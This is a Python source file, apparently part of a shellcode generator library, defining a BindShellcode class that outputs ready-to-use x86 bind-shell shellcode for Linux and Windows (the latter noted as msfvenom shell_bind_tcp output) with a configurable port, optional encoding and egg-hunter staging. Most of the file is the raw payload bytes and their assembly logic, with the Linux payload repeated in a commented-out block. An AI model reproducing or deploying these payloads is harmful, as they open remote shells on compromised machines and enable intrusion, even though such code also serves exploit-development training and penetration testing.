import socket, binascii, logging
from shellerate.encoder import *
from shellerate.egg_hunter import *

class BindShellcode:
    def __init__(self, port, arch, os):
      self.port   = port;
      self.arch   = arch;
      self.os     = os;
      self.valid  = False;
      self.debug  = False;

      self.__shellcode  = "";

      self.__egg_hunter           = False;
      self.__egg_hunter_key       = "\\x11\\x22\\x33\\x44";
      self.__egg_hunter_code      = ""
      self.__egg_hunter_shellcode = ""

      # Encoder stuff
      self.__encode     = False;
      self.__encode_key = "deadbeef";
      self.__encoded_shellcode = "";



    def encode(self):
      self.__encode = True;

    def egg_hunter(self):
        self.__egg_hunter = True;


    def set_egg_hunter_key(self, key):
      self.__egg_hunter_key = key;

    def set_encoding_key(self, key):
      self.__encode_key = key;

    def shellcode(self):
      if self.__encode == True:
        return self.__encoded_shellcode;

      if self.__egg_hunter == True:
        return {"egg_hunter_code": self.__egg_hunter_code, "egg_hunter_shellcode": self.__egg_hunter_shellcode};

      return self.__shellcode


                
    def check(self):
        self.valid = True;
        if self.port < 1024 or self.port > 65535:
            logging.debug("[!] invalid TCP port number: %d" % self.port);
            self.valid = False

    def __port_to_string(self):
        no_port = socket.htons(self.port);
        hex_no_port = hex(no_port)

        h1 = hex_no_port[2:4]
        h2 = hex_no_port[4:6]

        if h1 == "":
            h1 = "00"

        if len(h1) == 1:
            h1 = "0" + h1

        if h2 == "":
            h2 = "00"

        if len(h2) == 1:
            h2 = "0" + h2

        hex_port_number = "\\x%s\\x%s" % (h2, h1)
        return hex_port_number
        
    def generate(self):

      if self.os == "linux" and self.arch == "x86": 
        logging.debug("linux x86 bind shellcode")
        self.__shellcode = "\\x31\\xc0\\x89\\xc3\\x89\\xc1\\x89\\xc2\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc3\\x31\\xc0\\x66\\xb8\\x69\\x01\\x31\\xc9\\x51\\x66\\x68" + self.__port_to_string() + "\\x66\\x6a\\x02\\x89\\xe1\\xb2\\x10\\xcd\\x80\\x31\\xc9\\x31\\xc0\\x66\\xb8\\x6b\\x01\\xcd\\x80\\x31\\xc0\\x66\\xb8\\x6c\\x01\\x51\\x89\\xce\\x89\\xe1\\x89\\xe2\\xcd\\x80\\x89\\xc3\\x31\\xc9\\xb1\\x02\\x31\\xc0\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80";
      if self.os == "win" and self.arch == "x86":
        # this is plain msfvenom -p windows/shell_bind_tcp shellcode
        logging.debug("windows x86 bind shellcode")
        self.__shellcode = "\\xfc\\xe8\\x82\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xc0\\x64\\x8b\\x50\\x30\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72\\x28\\x0f\\xb7\\x4a\\x26\\x31\\xff\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf\\x0d\\x01\\xc7\\xe2\\xf2\\x52\\x57\\x8b\\x52\\x10\\x8b\\x4a\\x3c\\x8b\\x4c\\x11\\x78\\xe3\\x48\\x01\\xd1\\x51\\x8b\\x59\\x20\\x01\\xd3\\x8b\\x49\\x18\\xe3\\x3a\\x49\\x8b\\x34\\x8b\\x01\\xd6\\x31\\xff\\xac\\xc1\\xcf\\x0d\\x01\\xc7\\x38\\xe0\\x75\\xf6\\x03\\x7d\\xf8\\x3b\\x7d\\x24\\x75\\xe4\\x58\\x8b\\x58\\x24\\x01\\xd3\\x66\\x8b\\x0c\\x4b\\x8b\\x58\\x1c\\x01\\xd3\\x8b\\x04\\x8b\\x01\\xd0\\x89\\x44\\x24\\x24\\x5b\\x5b\\x61\\x59\\x5a\\x51\\xff\\xe0\\x5f\\x5f\\x5a\\x8b\\x12\\xeb\\x8d\\x5d\\x68\\x33\\x32\\x00\\x00\\x68\\x77\\x73\\x32\\x5f\\x54\\x68\\x4c\\x77\\x26\\x07\\xff\\xd5\\xb8\\x90\\x01\\x00\\x00\\x29\\xc4\\x54\\x50\\x68\\x29\\x80\\x6b\\x00\\xff\\xd5\\x6a\\x08\\x59\\x50\\xe2\\xfd\\x40\\x50\\x40\\x50\\x68\\xea\\x0f\\xdf\\xe0\\xff\\xd5\\x97\\x68\\x02\\x00" + self.__port_to_string() + "\\x89\\xe6\\x6a\\x10\\x56\\x57\\x68\\xc2\\xdb\\x37\\x67\\xff\\xd5\\x57\\x68\\xb7\\xe9\\x38\\xff\\xff\\xd5\\x57\\x68\\x74\\xec\\x3b\\xe1\\xff\\xd5\\x57\\x97\\x68\\x75\\x6e\\x4d\\x61\\xff\\xd5\\x68\\x63\\x6d\\x64\\x00\\x89\\xe3\\x57\\x57\\x57\\x31\\xf6\\x6a\\x12\\x59\\x56\\xe2\\xfd\\x66\\xc7\\x44\\x24\\x3c\\x01\\x01\\x8d\\x44\\x24\\x10\\xc6\\x00\\x44\\x54\\x50\\x56\\x56\\x56\\x46\\x56\\x4e\\x56\\x56\\x53\\x56\\x68\\x79\\xcc\\x3f\\x86\\xff\\xd5\\x89\\xe0\\x4e\\x56\\x46\\xff\\x30\\x68\\x08\\x87\\x1d\\x60\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x68\\xa6\\x95\\xbd\\x9d\\xff\\xd5\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x53\\xff\\xd5"


      if self.__encode:
        logging.debug("Custom encoder called");
        enc=Encoder(self.__shellcode, self.__encode_key)
        self.__encoded_shellcode = enc.encode()

      if self.__egg_hunter:
        logging.debug("An egg it has been found... creating egg hunter shellcode");
        egg = EggHunter(self.__shellcode, self.__egg_hunter_key)

        self.__egg_hunter_code = egg.hunter_code()
        self.__egg_hunter_shellcode=egg.generate()
      # else:
      #   self.__shellcode = "\\x31\\xc0\\x89\\xc3\\x89\\xc1\\x89\\xc2\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc3\\x31\\xc0\\x66\\xb8\\x69\\x01\\x31\\xc9\\x51\\x66\\x68" + self.__port_to_string() + "\\x66\\x6a\\x02\\x89\\xe1\\xb2\\x10\\xcd\\x80\\x31\\xc9\\x31\\xc0\\x66\\xb8\\x6b\\x01\\xcd\\x80\\x31\\xc0\\x66\\xb8\\x6c\\x01\\x51\\x89\\xce\\x89\\xe1\\x89\\xe2\\xcd\\x80\\x89\\xc3\\x31\\xc9\\xb1\\x02\\x31\\xc0\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80";



